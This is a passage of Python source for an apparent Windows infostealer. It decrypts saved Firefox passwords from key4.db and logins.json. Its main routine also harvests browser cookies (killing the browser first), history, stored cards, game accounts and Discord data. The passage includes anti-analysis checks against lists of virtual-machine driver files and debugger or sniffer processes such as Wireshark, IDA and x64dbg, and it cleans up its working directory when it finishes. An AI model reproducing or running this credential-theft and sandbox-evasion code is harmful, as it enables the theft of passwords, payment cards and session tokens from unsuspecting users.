                if txt:
                    return txt
            except Exception:
                continue
        for klen in (16, 24, 32):
            key = hashlib.sha1(seed).digest()
            key = (key * 2)[:klen]
            try:
                pt = unpad(AES.new(key, AES.MODE_CBC, iv16).decrypt(ct), 16)
                txt = pt.decode("utf-8")
                if txt:
                    return txt
            except Exception:
                continue
    return None


def _ff_master_key(key4, pw=""):
    try:
        conn = sqlite3.connect(key4)
        row = conn.execute("SELECT item1, item2 FROM metadata WHERE id='password'").fetchone()
        conn.close()
    except Exception:
        return None
    if not row:
        return None
    item1, item2 = row
    salts = _der_octets(item1)
    parts = _der_octets(item2)
    if not salts or len(parts) < 2:
        return None
    entry_salts = salts[:2]
    global_salts = [item1] + salts[:2]
    iv, ct = parts[0][:8], parts[-1]
    pw_b = pw.encode()

    for gs in global_salts:
        hp = hashlib.sha1(gs + pw_b).digest()
        for es in entry_salts:
            for key in _ff_keys(hp + es):
                try:
                    mk = unpad(DES3.new(key, DES3.MODE_CBC, iv).decrypt(ct), 8)
                except Exception:
                    continue
                if 8 <= len(mk) <= 64:
                    return mk
    return None


def _firefox_passwords():
    root = os.path.join(ROAM, r"Mozilla\Firefox\Profiles")
    if not os.path.isdir(root):
        return []
    out = []
    for prof in os.listdir(root):
        base = os.path.join(root, prof)
        logins = os.path.join(base, "logins.json")
        key4 = os.path.join(base, "key4.db")
        if not os.path.isfile(logins) or not os.path.isfile(key4):
            continue
        try:
            with open(logins, "r", encoding="utf-8") as f:
                data = json.load(f)
        except Exception:
            continue
        entries = data.get("logins", [])
        if not entries:
            continue
        mk = _ff_master_key(key4)
        if not mk:
            continue
        out.append("\n[Firefox :: {}]\n".format(prof))
        for e in entries:
            host = e.get("hostname", "?")
            if e.get("encType") == 0:
                user, pw = e.get("usernameField", ""), e.get("passwordField", "")
            else:
                user = _pk11_decrypt(mk, e.get("encryptedUsername", ""))
                pw = _pk11_decrypt(mk, e.get("encryptedPassword", ""))
                user = user if user is not None else "<fail>"
                pw = pw if pw is not None else "<fail>"
            if not user and not pw:
                continue
            out.append("{}\n    user: {}\n    pass: {}\n".format(host, user, pw))
    return out


def grab_passwords():
    lines = _chromium_passwords()
    try:
        lines += _firefox_passwords()
    except Exception:
        pass
    return "".join(lines) or "no saved passwords found"


VM_FILES = [
    r"C:\windows\system32\vmGuestLib.dll",
    r"C:\windows\system32\vm3dgl.dll",
    r"C:\windows\system32\vboxhook.dll",
    r"C:\windows\system32\vboxmrxnp.dll",
    r"C:\windows\system32\vmsrvc.dll",
    r"C:\windows\system32\drivers\vmsrvc.sys",
    r"C:\windows\system32\drivers\vboxguest.sys",
    r"C:\windows\system32\drivers\vmhgfs.sys",
]

BLACKLISTED_PROCESSES = [
    "vmtoolsd.exe", "vmwaretray.exe", "vmwareuser.exe", "vmacthlp.exe", "vgauthservice.exe",
    "fakenet.exe", "dumpcap.exe", "httpdebuggerui.exe", "wireshark.exe", "fiddler.exe",
    "vboxservice.exe", "vboxtray.exe", "df5serv.exe", "vboxhook.exe",
    "ida64.exe", "ida.exe", "ollydbg.exe", "x64dbg.exe", "x96dbg.exe", "x32dbg.exe",
    "pestudio.exe", "procmon.exe", "procmon64.exe", "processhacker.exe", "dnspy.exe",
    "prl_cc.exe", "prl_tools.exe", "xenservice.exe", "qemu-ga.exe",
    "joeboxcontrol.exe", "joeboxserver.exe", "ksdumper.exe", "ksdumperclient.exe",
    "regmon.exe", "filemon.exe", "cheatengine-x86_64.exe",
]


def protection_check(details=False):
    hits = []
    procs = set(_proc_names())
    for name in BLACKLISTED_PROCESSES:
        if name.lower() in procs:
            hits.append("proc:" + name)
    for f in VM_FILES:
        if os.path.exists(f):
            hits.append("file:" + os.path.basename(f))
    if details:
        return hits
    return bool(hits)


def mutex_exists(name):
    target = name.lower()
    if not target.endswith(".exe"):
        target += ".exe"
    return target in set(_proc_names())


def is_admin():
    try:
        return bool(ctypes.windll.shell32.IsUserAnAdmin())
    except Exception:
        return False


def vm_report():
    hits = protection_check(details=True)
    lines = [
        "sandbox   : {}".format("DETECTED" if hits else "clean"),
        "admin     : {}".format(is_admin()),
        "user      : {}".format(getuser()),
        "host      : {}".format(socket.gethostname()),
        "artifacts : {}".format(", ".join(hits) if hits else "none"),
    ]
    return "\n".join(lines)


BANNER = "=" * 52


def grab_all():
    blocks = []
    for title, fn in (("COOKIES", lambda: grab_cookies(kill=True)),
                      ("HISTORY", grab_history),
                      ("CARDS", grab_cards),
                      ("ACCOUNTS", grab_games),
                      ("PASSWORDS", grab_passwords),
                      ("DISCORD", grab_discord),
                      ("VMPROTECT", vm_report)):
        blocks.append(BANNER)
        blocks.append(title)
        blocks.append(BANNER)
        try:
            blocks.append(fn())
        except Exception as e:
            blocks.append("[error] {}".format(e))
        blocks.append("")
    return "\n".join(blocks)


def main():
    mode = (sys.argv[1].lower() if len(sys.argv) > 1 else "all")
    table = {
        "cookies": lambda: grab_cookies(kill=True),
        "history": grab_history,
        "cards": grab_cards,
        "games": grab_games,
        "accounts": grab_games,
        "discord": grab_discord,
        "discordjson": grab_discord_json,
        "discorddiag": grab_discord_diag,
        "passwords": grab_passwords,
        "passwd": grab_passwords,
        "vm": vm_report,
        "vmprotect": vm_report,
        "check": vm_report,
    }
    try:
        if mode in ("all", ""):
            print(grab_all())
        elif mode in table:
            print(table[mode]())
        else:
            print("unknown mode '{}'".format(mode))
    except Exception as e:
        print("[fatal] {}".format(e))
    finally:
        shutil.rmtree(_run_dir(), ignore_errors=True)


if __name__ == "__main__":
    main()